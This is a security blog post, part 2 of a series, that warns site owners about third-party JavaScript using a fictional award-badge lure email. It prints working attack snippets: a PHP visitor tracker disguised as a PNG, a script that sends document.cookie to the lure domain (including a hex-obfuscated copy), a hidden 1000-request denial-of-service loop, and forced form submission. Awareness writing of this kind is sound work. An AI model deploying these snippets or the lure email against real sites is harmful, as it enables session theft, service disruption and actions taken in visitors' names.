---
layout: post
title: 'The very bad things that Javascript can do: Part 2'
tags:
- html
- javascript
- security
---

In part 1, I discussed the various arguments I run into about wanting to be overly security conscious with our sites in regard to third party javascript. In this entry, we’ll run through a few scenarios.

In our scenarios here, we’re going to focus on a fake award site called “AwardSite” that gave our victim a winning notification. They are in the top 5% of 2013’s best websites. The servers have PHP and are apache servers.

Perhaps they send an email like this:


    Hello and congratulations!  Your site, http://victimsite.com, has won the prestigious Best of 2013 award from AwardSite.com!  
     
    Did you know you made it into the top 5%?  We're impressed, and you should be proud!
     
    Below, you'll find a snippet of code to insert into the footer of your website.  It shows off your great accomplishment.
     
    Did you know AwardSite.com has a very high Search Engine Optimization ranking?  We're already linking to your website -
    but that doesn't complete the circle.  If you use the banner in the code below, you not only show off your reputation this year but that reciprocal link helps Google AND Bing rank your site even higher.
     
    Congratulations again!
     
    Fake Guy
    AwardSite.com


And of course, at the very end of the email is some HTML or Javascript that they are prompted to put into their site.

Now, for our example, we’re going to use the following banner:

![](/uploads/2013/award.png)


Now, lets run through some scenarios.



### Hit Counter / Target Determination

In this case, the nefarious hacker wants to determine if this site has a lot of traffic. And, of that traffic, they want to determine what the demographics of the browsers are. This is a very easy information gathering attempt. This is what the code looks like:

```html
<a href="http://awardsite.com"><img src="http://awardsite.com/award.png?compress=134"></a>
```

Let’s break down what the code means, and then show the back-end. First, it is just a link to the awardsite website. The image is the banner that you saw above. Finally, that image has a pretty non-conspicuous get parameter called ‘compress’ which is set to the ID in the database of this particular victim site. It was important to use a word that SEEMED somewhat legitimate. Of course compress seems ok, so why would I judge that?

On the server, however, the file award.png is actually a PHP file. The apache server has configuration, perhaps in the .htaccess file, like this:

    <Files award.png>
        ForceType application/x-httpd-php
    </Files>

Then, the award.png file has the following PHP. (Please note, I’ve not went to the trouble to make sure this handles EVERY scenario… this is meant as a proof of concept).

Note: updateSite() is a function that writes an entry to the database using that siteID. I didn’t think it was important enough to show that code too.

```php?start_inline=1
$siteID = isset ($_GET['compress']) ? $_GET['compress'] : null;
 
if ($siteID) {
    $header = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    updateSite($siteID, $header);
}
 
header('Content-type: image/png');
readfile('sourceawardfile.png');
```

This code basically gets the siteID from the GET query. It then grabs the user agent and inserts that into the database with the siteID. This works as a hit-counter and a demographics tracking. The backend will have to have some sort of analytic processing software to determine which browsers are visiting, etc.

No matter if there’s a valid siteID or not, finally the png header gets sent and the real award file is sent to the browser.

In this case, our victim has allowed the “bad guy” to keep track of their visitors, times, and demographics. They can now determine if this is a high traffic site or not – and whether its worth targeting specifically with more sophisticated attacks.

### Cookie Stealing / Session Theft

PHP stores the session key as a cookie on the visitors browser named PHPSESSID by default. If the hacker had this cookie, and the session hadn’t expired, they could act as the victim. The goal here is to have a logged in user of victim website visit the bad Javascript. Then, the cookie is sent to the hacker who then uses that to steal the session of the victim.

Here is the source code for the HTML/Javascript from the email:

```html
<a href="http://awardsite.com" id="awardlink">
    <script>
        var i = new Image();
        i.src = 'http://awardsite.com/award.png?c=' + document.cookie;
        document.getElementById('awardlink').appendChild(i);
    </script>
</a>
```

Here, a new image is created. Then, it is sent to the award.png PHP file. In this case, we grab the entire document.cookie. The cookie can then be parsed from the string of the GET parameter. Finally, the image is added to the file and no one is the wiser.

Of course, this kind of can look a bit bad if you see the words ‘document.cookie’ – so we can obscure this a bit. Try this:

```javascript
var s = 'http://awardsite.com/award.png';
var i = new Image();
var _0xba4e=["\x63\x6F\x6F\x6B\x69\x65"];
var j=document[_0xba4e[0]];
i.src = concat(s,'?c=', j);
document.getElementById('awardlink').appendChild(i);
```    
        
Of course, it can look bad for our trained eyes… but for those who don’t “work on computers” they’ll just think its code they don’t understand and use it.

**For future examples, I won’t show how to obfuscate the code. But that would be one of the steps.**

### Denial of Service for Victim Site

What if we could make the visitor perform a denial of service? That wouldn’t be that hard.

```html
<a href="http://awardsite.com" id="awardlink">
    <script>
        var s = 'http://awardsite.com/award.png';
        var i = new Image();
        document.getElementById('awardlink').appendChild(i);
        setTimeout(function() {
            for (var x = 0; x < 1000; x++) {
                var j = new Image();
                j.style = 'display: none';
                j.src = 'http://victimsite.com/someasset.php';
                document.body.appendChild(j);
            }
        }, 3000);
    </script>
</a>
```

In this case, the image is added successfully. However, the setTimeout() method executes a different function 3 seconds later. The delay is so that the user won’t notice the delay in their browser (hopefully the entire site has loaded by then) – and it puts it in the background. Then, a new ‘image’ is created 1000 times and appended to the document – with a hidden display (so the visitor can’t tell). But, basically, one visitor to this site, especially if they spent some time just reading the content, loaded 1000 more requests than were necessary.

### Processing Actions as the Victim

We all know that we need to not have forms that submit with the method of GET if the action is something that adds/edits/updates information. This restricts me from creating a sample that uses the Image() object to load a fake form submission with GET parameters. However, it doesn’t stop us from submitting a form that MAY be on the current page.

```html
<a href="http://awardsite.com" id="awardlink">
    <script>
        var s = 'award.png';
        var i = new Image();
        i.src = s;
        document.getElementById('awardlink').appendChild(i);
        var f = document.getElementById('formID');
        f[0].value = 'Some Nefarious Input';
        f.submit();
    </script>
</a>
```

This code goes and gets the form with an ID of ‘formID’ and populates the first element with some bad information. Then it clicks submit.

This is bad, but there are some potential problems. What if… the form doesn’t have an ID? Remember, we could also do some research, determine this is the second form on the page, and substitute the following:

```javascript
var f = document.forms[1];
```


OK, but lets just say its distracting to the visitor when the form is submitting. It takes them away from what they’re doing – of course they’re going to report it. Well, we can force the form to be ajax, and then submit.

```javascript
f.onsubmit = function() {
    //code to create xmlhttprequest and send form as ajax
};
f.submit();
```

### So what does all this mean?

Now that you’ve seen the examples of what can happen, I hope it turns on a light that we need to be more vigilant about what we allow clients to put into your hosted applications.


        
